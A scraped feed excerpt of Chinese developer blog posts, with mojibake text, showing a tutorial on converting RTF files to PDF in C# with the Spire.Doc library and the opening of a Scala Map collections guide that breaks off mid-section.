data-v-61fb5e44="">
            å¦‚ä½•ä½¿ç”¨ C# å°† RTF è½¬æ¢ä¸º PDF
            <!----> <!----></h1> <div class="author-info-block block-hidden" data-v-61fb5e44=""><div class="author-info-box" data-v-61fb5e44=""><div class="author-name" data-v-61fb5e44=""><a href="/user/2253353867033484/posts" target="_blank" rel="" class="jj-link username username ellipsis" data-v-65b50b51="" data-v-292f6e48="" data-v-61fb5e44=""><span class="name" style="max-width:160px;" data-v-65b50b51="" data-v-292f6e48="">
    LSTM97
  </span> <!----> <!----> <!----> </a></div> <div class="meta-box" data-v-61fb5e44=""><time datetime="2025-11-27T06:15:26.000Z" title="Thu Nov 27 2025 06:15:26 GMT+0000 (Coordinated Universal Time)" class="time" data-v-61fb5e44="">
                    2025-11-27
                  </time> <svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" class="read-icon" data-v-61fb5e44=""><path d="M7.90078 2.80078C4.49278 2.80078 1.74745 6.11672 0.800781 7.77469C1.74745 9.58339 4.49278 13.2008 7.90078 13.2008C11.3088 13.2008 14.0541 9.58339 15.0008 7.77469C14.0541 6.11672 11.3088 2.80078 7.90078 2.80078Z" stroke="currentColor" data-v-61fb5e44=""/><circle cx="7.89922" cy="8.00078" r="2.2" stroke="currentColor" data-v-61fb5e44=""/></svg> <span class="views-count" data-v-61fb5e44="">
                    1
                  </span> <span class="read-time" data-v-61fb5e44=""><svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" data-v-61fb5e44=""><rect width="16" height="16" fill="none" data-v-61fb5e44=""/><circle cx="8" cy="8" r="5.65625" stroke="#8A919F" data-v-61fb5e44=""/><path d="M7.69141 5.18652V8.30924H10.8141" stroke="#8A919F" stroke-linecap="round" stroke-linejoin="round" data-v-61fb5e44=""/></svg>
                    é˜…è¯»3åˆ†é’Ÿ
                  </span> <!----></div></div> <div style="flex:1;" data-v-61fb5e44=""/> <!----> <!----></div> <!----> <!----> <!----> <!----> <div id="article-root" itemprop="articleBody" class="main" data-v-61fb5e44=""><div class="article-viewer markdown-body result"><style>.markdown-body{word-break:break-word;line-height:1.75;font-weight:400;font-size:16px;overflow-x:hidden;color:#252933}.markdown-body h1,.markdown-body h2,.markdown-body h3,.markdown-body h4,.markdown-body h5,.markdown-body h6{line-height:1.5;margin-top:35px;margin-bottom:10px;padding-bottom:5px}.markdown-body h1{font-size:24px;line-height:38px;margin-bottom:5px}.markdown-body h2{font-size:22px;line-height:34px;padding-bottom:12px;border-bottom:1px solid #ececec}.markdown-body h3{font-size:20px;line-height:28px}.markdown-body h4{font-size:18px;line-height:26px}.markdown-body h5{font-size:17px;line-height:24px}.markdown-body h6{font-size:16px;line-height:24px}.markdown-body p{line-height:inherit;margin-top:22px;margin-bottom:22px}.markdown-body img{max-width:100%}.markdown-body hr{border:none;border-top:1px solid #ddd;margin-top:32px;margin-bottom:32px}.markdown-body code{word-break:break-word;border-radius:2px;overflow-x:auto;background-color:#fff5f5;color:#ff502c;font-size:.87em;padding:.065em .4em}.markdown-body code,.markdown-body pre{font-family:Menlo,Monaco,Consolas,Courier New,monospace}.markdown-body pre{overflow:auto;position:relative;line-height:1.75}.markdown-body pre&gt;code{font-size:12px;padding:15px 12px;margin:0;word-break:normal;display:block;overflow-x:auto;color:#333;background:#f8f8f8}.markdown-body a{text-decoration:none;color:#0269c8;border-bottom:1px solid #d1e9ff}.markdown-body a:active,.markdown-body a:hover{color:#275b8c}.markdown-body table{display:inline-block!important;font-size:12px;width:auto;max-width:100%;overflow:auto;border:1px solid #f6f6f6}.markdown-body thead{background:#f6f6f6;color:#000;text-align:left}.markdown-body tr:nth-child(2n){background-color:#fcfcfc}.markdown-body td,.markdown-body th{padding:12px 7px;line-height:24px}.markdown-body td{min-width:120px}.markdown-body blockquote{color:#666;padding:1px 23px;margin:22px 0;border-left:4px solid #cbcbcb;background-color:#f8f8f8}.markdown-body blockquote:after{display:block;content:""}.markdown-body blockquote&gt;p{margin:10px 0}.markdown-body ol,.markdown-body ul{padding-left:28px}.markdown-body ol li,.markdown-body ul li{margin-bottom:0;list-style:inherit}.markdown-body ol li .task-list-item,.markdown-body ul li .task-list-item{list-style:none}.markdown-body ol li .task-list-item ol,.markdown-body ol li .task-list-item ul,.markdown-body ul li .task-list-item ol,.markdown-body ul li .task-list-item ul{margin-top:0}.markdown-body ol ol,.markdown-body ol ul,.markdown-body ul ol,.markdown-body ul ul{margin-top:3px}.markdown-body ol li{padding-left:6px}.markdown-body .contains-task-list{padding-left:0}.markdown-body .task-list-item{list-style:none}@media (max-width:720px){.markdown-body h1{font-size:24px}.markdown-body h2{font-size:20px}.markdown-body h3{font-size:18px}}</style><style data-highlight="" data-highlight-key="juejin">.markdown-body pre,.markdown-body pre&gt;code.hljs{color:#333;background:#f8f8f8}.hljs-comment,.hljs-quote{color:#998;font-style:italic}.hljs-keyword,.hljs-selector-tag,.hljs-subst{color:#333;font-weight:700}.hljs-literal,.hljs-number,.hljs-tag .hljs-attr,.hljs-template-variable,.hljs-variable{color:teal}.hljs-doctag,.hljs-string{color:#d14}.hljs-section,.hljs-selector-id,.hljs-title{color:#900;font-weight:700}.hljs-subst{font-weight:400}.hljs-class .hljs-title,.hljs-type{color:#458;font-weight:700}.hljs-attribute,.hljs-name,.hljs-tag{color:navy;font-weight:400}.hljs-link,.hljs-regexp{color:#009926}.hljs-bullet,.hljs-symbol{color:#990073}.hljs-built_in,.hljs-builtin-name{color:#0086b3}.hljs-meta{color:#999;font-weight:700}.hljs-deletion{background:#fdd}.hljs-addition{background:#dfd}.hljs-emphasis{font-style:italic}.hljs-strong{font-weight:700}</style><p>RTFï¼ˆRich Text Formatï¼‰æ˜¯ä¸€ç§é€šç”¨çš„æ–‡æ¡£æ ¼å¼ï¼Œå…è®¸ç”¨æˆ·åœ¨ä¸åŒçš„æ–‡å­—å¤„ç†è½¯ä»¶ä¸­ä¿å­˜å’Œäº¤æ¢æ ¼å¼åŒ–æ–‡æœ¬ã€‚PDFï¼ˆPortable Document Formatï¼‰åˆ™æ˜¯ä¸€ç§å¹¿æ³›ä½¿ç”¨çš„æ–‡æ¡£æ ¼å¼ï¼Œå®ƒèƒ½å¤Ÿä¿ç•™æ–‡æ¡£çš„åŸå§‹å¸ƒå±€ï¼Œæ— è®ºåœ¨å“ªç§è®¾å¤‡ä¸ŠæŸ¥çœ‹éƒ½èƒ½ä¿æŒä¸€è‡´ã€‚å› æ­¤ï¼Œå°† RTF æ–‡ä»¶è½¬æ¢ä¸º PDF æ–‡ä»¶åœ¨è®¸å¤šåº”ç”¨åœºæ™¯ä¸­éƒ½ååˆ†é‡è¦ã€‚æœ¬æ–‡å°†ä»‹ç»å¦‚ä½•ä½¿ç”¨ Spire.Doc for .NET æ¥å®ç°è¿™ä¸€åŠŸèƒ½ã€‚</p>
<h2 data-id="heading-0">Spire.Doc for .NET ç®€ä»‹</h2>
<p>Spire.Doc æ˜¯ä¸€æ¬¾ .NET å¹³å°çš„ç»„ä»¶ï¼Œå¯ä»¥è½»æ¾åœ°å¤„ç† Word æ–‡æ¡£ï¼ŒåŒ…æ‹¬åˆ›å»ºã€ç¼–è¾‘ã€è½¬æ¢å’Œæ‰“å°æ–‡æ¡£ã€‚è¯¥ç»„ä»¶æ”¯æŒå¤šç§æ–‡æ¡£æ ¼å¼ï¼Œè¯¸å¦‚ DOC, DOCX, RTF, HTML, TXT, PDF ç­‰ã€‚ä½¿ç”¨ Spire.Docï¼Œå¼€å‘è€…å¯ä»¥å¿«é€Ÿå®ç°å¤æ‚çš„æ–‡æ¡£æ“ä½œï¼Œè€Œæ— éœ€æ·±å…¥äº†è§£åº•å±‚æ–‡æ¡£æ ¼å¼ã€‚</p>
<h2 data-id="heading-1">å®‰è£… Spire.Doc</h2>
<p>è¦ä½¿ç”¨ Spire.Doc è¿›è¡Œ RTF åˆ° PDF çš„è½¬æ¢ï¼Œå¯ä»¥é€šè¿‡ NuGet åŒ…ç®¡ç†å™¨è¿›è¡Œå®‰è£…ã€‚ä»¥ä¸‹æ˜¯å®‰è£…çš„æ­¥éª¤ï¼š</p>
<ol>
<li>æ‰“å¼€ Visual Studio å¹¶åˆ›å»ºä¸€ä¸ªæ–°é¡¹ç›®ï¼ˆä¾‹å¦‚ï¼Œæ§åˆ¶å°åº”ç”¨ç¨‹åºï¼‰ã€‚</li>
<li>å³é”®å•å‡»é¡¹ç›®ï¼Œé€‰æ‹©â€œç®¡ç† NuGet åŒ…â€ã€‚</li>
<li>åœ¨æµè§ˆé€‰é¡¹å¡ä¸­ï¼Œæœç´¢â€œSpire.Docâ€ï¼Œå¹¶ç‚¹å‡»â€œå®‰è£…â€ä»¥æ·»åŠ è¯¥åº“ã€‚</li>
</ol>
<h2 data-id="heading-2">ä»£ç ç¤ºä¾‹</h2>
<p>ä»¥ä¸‹æ˜¯ä¸€ä¸ªç®€å•çš„ä»£ç ç¤ºä¾‹ï¼Œæ¼”ç¤ºå¦‚ä½•ä½¿ç”¨ Spire.Doc å°† RTF æ–‡ä»¶è½¬æ¢ä¸º PDF æ–‡ä»¶ï¼š</p>
<pre><code class="hljs language-typescript" lang="typescript">usingÂ <span class="hljs-title class_">Spire</span>.<span class="hljs-property">Doc</span>;
usingÂ <span class="hljs-title class_">Spire</span>.<span class="hljs-property">Doc</span>.<span class="hljs-property">Documents</span>;

classProgram
{
<span class="hljs-title function_">staticvoidMain</span>(<span class="hljs-params"><span class="hljs-built_in">string</span>[]Â args</span>)
Â Â Â Â {
Â Â Â Â <span class="hljs-comment">//Â åˆ›å»ºä¸€ä¸ªÂ DocumentÂ å¯¹è±¡</span>
Â Â Â Â Â Â Â Â <span class="hljs-title class_">Document</span>Â <span class="hljs-variable language_">document</span>Â =Â <span class="hljs-keyword">new</span>Â <span class="hljs-title class_">Document</span>();

Â Â Â Â <span class="hljs-comment">//Â åŠ è½½Â RTFÂ æ–‡ä»¶</span>
Â Â Â Â Â Â Â Â <span class="hljs-variable language_">document</span>.<span class="hljs-title class_">LoadFromFile</span>(<span class="hljs-string">"input.rtf"</span>);

Â Â Â Â <span class="hljs-comment">//Â ä¿å­˜ä¸ºÂ PDFÂ æ–‡ä»¶</span>
Â Â Â Â Â Â Â Â <span class="hljs-variable language_">document</span>.<span class="hljs-title class_">SaveToFile</span>(<span class="hljs-string">"output.pdf"</span>,Â <span class="hljs-title class_">FileFormat</span>.<span class="hljs-property">PDF</span>);

Â Â Â Â <span class="hljs-comment">//Â è¾“å‡ºæˆåŠŸä¿¡æ¯</span>
Â Â Â Â Â Â Â Â <span class="hljs-title class_">Console</span>.<span class="hljs-title class_">WriteLine</span>(<span class="hljs-string">"RTFÂ æ–‡ä»¶æˆåŠŸè½¬æ¢ä¸ºÂ PDFÂ æ–‡ä»¶ï¼"</span>);
Â Â Â Â }
}
</code></pre>
<h3 data-id="heading-3">ä»£ç è¯¦è§£</h3>
<ol>
<li><strong>åŠ è½½ RTF æ–‡ä»¶</strong> ï¼šä½¿ç”¨ <code>document.LoadFromFile()</code> æ–¹æ³•åŠ è½½æŒ‡å®šè·¯å¾„çš„ RTF æ–‡ä»¶ã€‚</li>
<li><strong>ä¿å­˜ä¸º PDF æ–‡ä»¶</strong> ï¼šé€šè¿‡ <code>document.SaveToFile()</code> æ–¹æ³•ï¼Œå°†åŠ è½½çš„æ–‡æ¡£ä¿å­˜ä¸º PDF æ ¼å¼ã€‚æ­¤æ–¹æ³•çš„ç¬¬ä¸€ä¸ªå‚æ•°æ˜¯è¾“å‡ºæ–‡ä»¶çš„è·¯å¾„ï¼Œç¬¬äºŒä¸ªå‚æ•°åˆ™æ˜¯æ–‡ä»¶æ ¼å¼ã€‚</li>
<li><strong>è¾“å‡ºæˆåŠŸä¿¡æ¯</strong> ï¼šæ§åˆ¶å°è¾“å‡ºä¿¡æ¯æç¤ºç”¨æˆ·è½¬æ¢æˆåŠŸã€‚</li>
</ol>
<h2 data-id="heading-4">å¤„ç†å¼‚å¸¸</h2>
<p>åœ¨å®é™…å¼€å‘ä¸­ï¼Œå¤„ç†å¼‚å¸¸æ˜¯éå¸¸é‡è¦çš„ã€‚ä¸‹é¢çš„ç¤ºä¾‹å±•ç¤ºäº†å¦‚ä½•æ·»åŠ å¼‚å¸¸å¤„ç†ï¼š</p>
<p>csharp</p>
<pre><code class="hljs language-typescript" lang="typescript">usingÂ <span class="hljs-title class_">System</span>;
usingÂ <span class="hljs-title class_">Spire</span>.<span class="hljs-property">Doc</span>;

classProgram
{
<span class="hljs-title function_">staticvoidMain</span>(<span class="hljs-params"><span class="hljs-built_in">string</span>[]Â args</span>)
Â Â Â Â {
<span class="hljs-keyword">try</span>
Â Â Â Â Â Â Â Â {
Â Â Â Â Â Â Â Â <span class="hljs-comment">//Â åˆ›å»ºÂ DocumentÂ å¯¹è±¡</span>
Â Â Â Â Â Â Â Â Â Â Â Â <span class="hljs-title class_">Document</span>Â <span class="hljs-variable language_">document</span>Â =Â <span class="hljs-keyword">new</span>Â <span class="hljs-title class_">Document</span>();
Â Â Â Â Â Â Â Â Â Â Â Â <span class="hljs-comment">//Â åŠ è½½Â RTFÂ æ–‡ä»¶</span>
Â Â Â Â Â Â Â Â Â Â Â Â <span class="hljs-variable language_">document</span>.<span class="hljs-title class_">LoadFromFile</span>(<span class="hljs-string">"input.rtf"</span>);
Â Â Â Â Â Â Â Â Â Â Â Â <span class="hljs-comment">//Â ä¿å­˜ä¸ºÂ PDFÂ æ–‡ä»¶</span>
Â Â Â Â Â Â Â Â Â Â Â Â <span class="hljs-variable language_">document</span>.<span class="hljs-title class_">SaveToFile</span>(<span class="hljs-string">"output.pdf"</span>,Â <span class="hljs-title class_">FileFormat</span>.<span class="hljs-property">PDF</span>);
Â Â Â Â Â Â Â Â Â Â Â Â <span class="hljs-title class_">Console</span>.<span class="hljs-title class_">WriteLine</span>(<span class="hljs-string">"RTFÂ æ–‡ä»¶æˆåŠŸè½¬æ¢ä¸ºÂ PDFÂ æ–‡ä»¶ï¼"</span>);
Â Â Â Â Â Â Â Â }
Â Â Â Â Â Â Â Â <span class="hljs-keyword">catch</span>Â (<span class="hljs-title class_">Exception</span>Â ex)
Â Â Â Â Â Â Â Â {
Â Â Â Â Â Â Â Â Â Â Â Â <span class="hljs-title class_">Console</span>.<span class="hljs-title class_">WriteLine</span>($<span class="hljs-string">"å‘ç”Ÿé”™è¯¯ï¼š{ex.Message}"</span>);
Â Â Â Â Â Â Â Â }
Â Â Â Â }
}
</code></pre>
<p>é€šè¿‡æŠ›å‡ºå¼‚å¸¸ï¼Œç”¨æˆ·å¯ä»¥ç¡®è®¤æ–‡ä»¶è·¯å¾„æ˜¯å¦æ­£ç¡®æˆ–æ˜¯å¦å­˜åœ¨å…¶ä»–é—®é¢˜ã€‚</p>
<h2 data-id="heading-5">æ€»ç»“</h2>
<p>ä½¿ç”¨ Spire.Doc for .NET è½¬æ¢ RTF æ–‡ä»¶ä¸º PDF æ–‡ä»¶éå¸¸ç®€å•ï¼Œåªéœ€å‡ è¡Œä»£ç å³å¯å®Œæˆã€‚é€šè¿‡åŠ è½½ RTF æ–‡ä»¶å¹¶å°†å…¶ä¿å­˜ä¸º PDFï¼Œå¼€å‘è€…èƒ½å¤Ÿåœ¨è‡ªå·±çš„åº”ç”¨ç¨‹åºä¸­è½»æ¾å®ç°æ–‡æ¡£å¤„ç†åŠŸèƒ½ã€‚æ­¤å¤–ï¼Œé€šè¿‡é€‚å½“çš„å¼‚å¸¸å¤„ç†ï¼Œå¯ä»¥å¢å¼ºç¨‹åºçš„å¥å£®æ€§ï¼Œä½¿å¾—ç”¨æˆ·ä½“éªŒæ›´ä½³ã€‚</p>
<p>è¿™ç§æ–‡æ¡£è½¬æ¢åœ¨å®é™…åº”ç”¨ä¸­å…·æœ‰å¹¿æ³›çš„åº”ç”¨åœºæ™¯ï¼Œå¦‚æŠ¥å‘Šç”Ÿæˆã€æ•°æ®å¯¼å‡ºå’Œæ–‡æ¡£å…±äº«ç­‰ã€‚æ— è®ºæ˜¯ä¸šåŠ¡åº”ç”¨è¿˜æ˜¯å­¦æœ¯éœ€æ±‚ï¼ŒæŒæ¡è¿™ç§æŠ€èƒ½éƒ½æ˜¯ç°ä»£å¼€å‘è€…ä¸å¯æˆ–ç¼ºçš„èƒ½åŠ›ã€‚</p></div></div></article> <div class="article-end" data-v-539963b4="" data-v-61fb5e44=""><div class="rank-entry-bottom" data-v-539963b4="" data-v-61fb5e44=""><!----></div> <div class="tag-list-box" data-v-539963b4="" data-v-61fb5e44=""><!----><!----><!----></div></div> <!----><!----><!----><!----><!----><style>	.markdown-body { color: #828182;}</style>]]></description></item><item>    <title><![CDATA[Scala Mapé›†åˆå®Œå…¨æŒ‡å—ï¼šä»å…¥é—¨åˆ°å®æˆ˜åº”ç”¨]]></title>    <link>https://juejin.cn/post/7576978338754740274</link>    <guid>https://juejin.cn/post/7576978338754740274</guid>    <pubDate>2025-11-27T06:25:19.000Z</pubDate>    <description><![CDATA[<article itemscope="itemscope" itemtype="http://schema.org/Article" data-entry-id="7576978338754740274" data-draft-id="7576867727718547491" data-original-type="0" class="article" data-v-61fb5e44=""><!----> <meta itemprop="headline" content="Scala Mapé›†åˆå®Œå…¨æŒ‡å—ï¼šä»å…¥é—¨åˆ°å®æˆ˜åº”ç”¨"/> <meta itemprop="keywords" content="Scala,åç«¯,ç¼–ç¨‹è¯­è¨€"/> <meta itemprop="datePublished" content="2025-11-27T06:25:19.000Z"/> <meta itemprop="image" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-128.png~tplv-t2oaga2asx-image.image"/> <div itemprop="author" itemscope="itemscope" itemtype="http://schema.org/Person"><meta itemprop="name" content="ä»Šå¤©æ²¡æœ‰ç›"/> <meta itemprop="url" content="https://juejin.cn/user/1408937846645355"/></div> <div itemprop="publisher" itemscope="itemscope" itemtype="http://schema.org/Organization"><meta itemprop="name" content="æ˜é‡‘"/> <div itemprop="logo" itemscope="itemscope" itemtype="https://schema.org/ImageObject"><meta itemprop="url" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-white-180.png~tplv-t2oaga2asx-image.image"/> <meta itemprop="width" content="180"/> <meta itemprop="height" content="180"/></div></div> <h1 class="article-title" data-v-61fb5e44="">
            Scala Mapé›†åˆå®Œå…¨æŒ‡å—ï¼šä»å…¥é—¨åˆ°å®æˆ˜åº”ç”¨
            <!----> <!----></h1> <div class="author-info-block block-hidden" data-v-61fb5e44=""><div class="author-info-box" data-v-61fb5e44=""><div class="author-name" data-v-61fb5e44=""><a href="/user/1408937846645355/posts" target="_blank" rel="" class="jj-link username username ellipsis" data-v-65b50b51="" data-v-292f6e48="" data-v-61fb5e44=""><span class="name" style="max-width:160px;" data-v-65b50b51="" data-v-292f6e48="">
    ä»Šå¤©æ²¡æœ‰ç›
  </span> <!----> <!----> <!----> </a></div> <div class="meta-box" data-v-61fb5e44=""><time datetime="2025-11-27T06:25:19.000Z" title="Thu Nov 27 2025 06:25:19 GMT+0000 (Coordinated Universal Time)" class="time" data-v-61fb5e44="">
                    2025-11-27
                  </time> <svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" class="read-icon" data-v-61fb5e44=""><path d="M7.90078 2.80078C4.49278 2.80078 1.74745 6.11672 0.800781 7.77469C1.74745 9.58339 4.49278 13.2008 7.90078 13.2008C11.3088 13.2008 14.0541 9.58339 15.0008 7.77469C14.0541 6.11672 11.3088 2.80078 7.90078 2.80078Z" stroke="currentColor" data-v-61fb5e44=""/><circle cx="7.89922" cy="8.00078" r="2.2" stroke="currentColor" data-v-61fb5e44=""/></svg> <span class="views-count" data-v-61fb5e44="">
                    1
                  </span> <span class="read-time" data-v-61fb5e44=""><svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" data-v-61fb5e44=""><rect width="16" height="16" fill="none" data-v-61fb5e44=""/><circle cx="8" cy="8" r="5.65625" stroke="#8A919F" data-v-61fb5e44=""/><path d="M7.69141 5.18652V8.30924H10.8141" stroke="#8A919F" stroke-linecap="round" stroke-linejoin="round" data-v-61fb5e44=""/></svg>
                    é˜…è¯»4åˆ†é’Ÿ
                  </span> <!----></div></div> <div style="flex:1;" data-v-61fb5e44=""/> <!----> <!----></div> <!----> <!----> <!----> <!----> <div id="article-root" itemprop="articleBody" class="main" data-v-61fb5e44=""><div class="article-viewer markdown-body result"><style>.markdown-body{word-break:break-word;line-height:1.75;font-weight:400;font-size:16px;overflow-x:hidden;color:#252933}.markdown-body h1,.markdown-body h2,.markdown-body h3,.markdown-body h4,.markdown-body h5,.markdown-body h6{line-height:1.5;margin-top:35px;margin-bottom:10px;padding-bottom:5px}.markdown-body h1{font-size:24px;line-height:38px;margin-bottom:5px}.markdown-body h2{font-size:22px;line-height:34px;padding-bottom:12px;border-bottom:1px solid #ececec}.markdown-body h3{font-size:20px;line-height:28px}.markdown-body h4{font-size:18px;line-height:26px}.markdown-body h5{font-size:17px;line-height:24px}.markdown-body h6{font-size:16px;line-height:24px}.markdown-body p{line-height:inherit;margin-top:22px;margin-bottom:22px}.markdown-body img{max-width:100%}.markdown-body hr{border:none;border-top:1px solid #ddd;margin-top:32px;margin-bottom:32px}.markdown-body code{word-break:break-word;border-radius:2px;overflow-x:auto;background-color:#fff5f5;color:#ff502c;font-size:.87em;padding:.065em .4em}.markdown-body code,.markdown-body pre{font-family:Menlo,Monaco,Consolas,Courier New,monospace}.markdown-body pre{overflow:auto;position:relative;line-height:1.75}.markdown-body pre&gt;code{font-size:12px;padding:15px 12px;margin:0;word-break:normal;display:block;overflow-x:auto;color:#333;background:#f8f8f8}.markdown-body a{text-decoration:none;color:#0269c8;border-bottom:1px solid #d1e9ff}.markdown-body a:active,.markdown-body a:hover{color:#275b8c}.markdown-body table{display:inline-block!important;font-size:12px;width:auto;max-width:100%;overflow:auto;border:1px solid #f6f6f6}.markdown-body thead{background:#f6f6f6;color:#000;text-align:left}.markdown-body tr:nth-child(2n){background-color:#fcfcfc}.markdown-body td,.markdown-body th{padding:12px 7px;line-height:24px}.markdown-body td{min-width:120px}.markdown-body blockquote{color:#666;padding:1px 23px;margin:22px 0;border-left:4px solid #cbcbcb;background-color:#f8f8f8}.markdown-body blockquote:after{display:block;content:""}.markdown-body blockquote&gt;p{margin:10px 0}.markdown-body ol,.markdown-body ul{padding-left:28px}.markdown-body ol li,.markdown-body ul li{margin-bottom:0;list-style:inherit}.markdown-body ol li .task-list-item,.markdown-body ul li .task-list-item{list-style:none}.markdown-body ol li .task-list-item ol,.markdown-body ol li .task-list-item ul,.markdown-body ul li .task-list-item ol,.markdown-body ul li .task-list-item ul{margin-top:0}.markdown-body ol ol,.markdown-body ol ul,.markdown-body ul ol,.markdown-body ul ul{margin-top:3px}.markdown-body ol li{padding-left:6px}.markdown-body .contains-task-list{padding-left:0}.markdown-body .task-list-item{list-style:none}@media (max-width:720px){.markdown-body h1{font-size:24px}.markdown-body h2{font-size:20px}.markdown-body h3{font-size:18px}}</style><style data-highlight="" data-highlight-key="juejin">.markdown-body pre,.markdown-body pre&gt;code.hljs{color:#333;background:#f8f8f8}.hljs-comment,.hljs-quote{color:#998;font-style:italic}.hljs-keyword,.hljs-selector-tag,.hljs-subst{color:#333;font-weight:700}.hljs-literal,.hljs-number,.hljs-tag .hljs-attr,.hljs-template-variable,.hljs-variable{color:teal}.hljs-doctag,.hljs-string{color:#d14}.hljs-section,.hljs-selector-id,.hljs-title{color:#900;font-weight:700}.hljs-subst{font-weight:400}.hljs-class .hljs-title,.hljs-type{color:#458;font-weight:700}.hljs-attribute,.hljs-name,.hljs-tag{color:navy;font-weight:400}.hljs-link,.hljs-regexp{color:#009926}.hljs-bullet,.hljs-symbol{color:#990073}.hljs-built_in,.hljs-builtin-name{color:#0086b3}.hljs-meta{color:#999;font-weight:700}.hljs-deletion{background:#fdd}.hljs-addition{background:#dfd}.hljs-emphasis{font-style:italic}.hljs-strong{font-weight:700}</style><h2 data-id="heading-0">å¯¼å…¥</h2>
<p>åœ¨ Scala ä¸­ï¼Œé›†åˆä½“ç³»ä¸ Python ä¸åŒï¼šæ²¡æœ‰ç›´æ¥åä¸º Set çš„éœ€å¯¼å…¥åŸºç¡€ç±»â€”â€”Set æ˜¯ Scala æ ‡å‡†åº“çš„æ ¸å¿ƒé›†åˆï¼ˆä½äº scala.collection åŒ…ä¸‹ï¼‰ï¼Œé»˜è®¤æ— éœ€æ‰‹åŠ¨å¯¼å…¥å³å¯ä½¿ç”¨ã€‚ä½†éœ€æ³¨æ„ Scala çš„ Set åˆ†ä¸ºä¸å¯å˜ï¼ˆé»˜è®¤ï¼‰å’Œå¯å˜ä¸¤ç§ã€‚æœ¬æ–‡å°†å…·ä½“ä»æ ¼å¼å®šä¹‰åˆ°å¸¸è§æ“ä½œæ¥è®²è¿°é›†åˆ Setã€‚</p>
<h2 data-id="heading-1">ä¸€ã€Mapçš„å®šä¹‰å’Œåˆ›å»º</h2>
<h3 data-id="heading-2">å®šä¹‰</h3>
<p>Mapï¼ˆæ˜ å°„ï¼‰æ˜¯Scalaä¸­ä¸€ç§å­˜å‚¨é”®å€¼å¯¹ï¼ˆkey-valueï¼‰çš„æ•°æ®ç»“æ„ï¼Œæ¯ä¸ªé”®åœ¨Mapä¸­æ˜¯å”¯ä¸€çš„ï¼Œé€šè¿‡é”®å¯ä»¥å¿«é€ŸæŸ¥æ‰¾åˆ°å¯¹åº”çš„å€¼ã€‚</p>
<h3 data-id="heading-3">å¥½å¤„</h3>
<ul>
<li><strong>å¿«é€ŸæŸ¥æ‰¾</strong>ï¼šé€šè¿‡é”®å¯ä»¥åœ¨å¸¸æ•°æ—¶é—´å†…è®¿é—®å¯¹åº”çš„å€¼</li>
<li><strong>æ•°æ®å…³è”</strong>ï¼šèƒ½å¤Ÿå»ºç«‹æœ‰é€»è¾‘å…³è”çš„æ•°æ®ç»“æ„</li>
<li><strong>ç±»å‹å®‰å…¨</strong>ï¼šç¼–è¯‘æ—¶æ£€æŸ¥é”®å€¼ç±»å‹</li>
<li><strong>çµæ´»æ€§</strong>ï¼šæ”¯æŒå¯å˜å’Œä¸å¯å˜ä¸¤ç§å®ç°æ–¹å¼</li>
</ul>
<h3 data-id="heading-4">è¯­æ³•</h3>
<pre><code class="hljs language-scala" lang="scala"><span class="hljs-comment">// ä¸å¯å˜Map</span>
<span class="hljs-keyword">val</span> mapName: <span class="hljs-type">Map</span>[<span class="hljs-type">KeyType</span>, <span class="hljs-type">ValueType</span>] = <span class="hljs-type">Map</span>(key1 -&gt; value1, key2 -&gt; value2,...)

<span class="hljs-comment">// å¯å˜Map (éœ€å¯¼å…¥scala.collection.mutable.Map)</span>
<span class="hljs-keyword">val</span> mapName: mutable.<span class="hljs-type">Map</span>[<span class="hljs-type">KeyType</span>, <span class="hljs-type">ValueType</span>] = mutable.<span class="hljs-type">Map</span>(key1 -&gt; value2,...)
</code></pre>
<h2 data-id="heading-5">äºŒã€Mapçš„åŸºæœ¬æ“ä½œ</h2>
<h3 data-id="heading-6">æ¡ˆä¾‹ä¸€ï¼šå¯å˜Mapä¸ä¸å¯å˜Mapçš„åŸºæœ¬æ“ä½œ</h3>
<h4 data-id="heading-7">ä»£ç </h4>
<pre><code class="hljs language-scala" lang="scala"><span class="hljs-keyword">package</span> map

<span class="hljs-comment">/*
 * Mapï¼Œæ˜ å°„ï¼Œè¡¨ç¤ºä¸€ç§ä¸€ä¸€å¯¹åº”å…³ç³»ï¼
 */</span>
<span class="hljs-class"><span class="hljs-keyword">object</span> <span class="hljs-title">map01</span> </span>{
  <span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">main</span></span>(args: <span class="hljs-type">Array</span>[<span class="hljs-type">String</span>]): <span class="hljs-type">Unit</span> = {
    <span class="hljs-comment">// åˆ›å»ºå¯å˜çš„Map é”® å€¼ å¯¹</span>
    <span class="hljs-keyword">val</span> scores = scala.collection.mutable.<span class="hljs-type">Map</span>(<span class="hljs-string">"alice"</span> -&gt; <span class="hljs-number">90</span>, <span class="hljs-string">"bob"</span> -&gt; <span class="hljs-number">85</span>)
    <span class="hljs-comment">// æ·»åŠ </span>
    scores += (<span class="hljs-string">"max"</span> -&gt; <span class="hljs-number">100</span>)

    println(scores)

    <span class="hljs-comment">// åˆ›å»ºä¸å¯å˜çš„Map</span>
    <span class="hljs-keyword">val</span> provinceInfo = scala.collection.immutable.<span class="hljs-type">Map</span>(<span class="hljs-string">"42"</span> -&gt; <span class="hljs-string">"æ¹–åŒ—"</span>)
    <span class="hljs-comment">// provinceInfo += ("14" -&gt; "å±±è¥¿")</span>
    <span class="hljs-keyword">val</span> newInfo = provinceInfo + (<span class="hljs-string">"14"</span> -&gt; <span class="hljs-string">"å±±è¥¿"</span>)
    println(newInfo)
  }
}
</code></pre>
<h4 data-id="heading-8">ç»“æœå±•ç¤º</h4>
<p><img src="https://p9-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/f86952315ed6480786f8e47076e74b4d~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg5LuK5aSp5rKh5pyJ55uQ:q75.awebp?rk3s=f64ab15b&amp;x-expires=1764829518&amp;x-signature=m6QMYs2YgcY5k%2BN899H6fpOJ0Zk%3D" alt="01.png" loading="lazy"/></p>
<h4 data-id="heading-9">ä»£ç åˆ†æ</h4>
<ol>
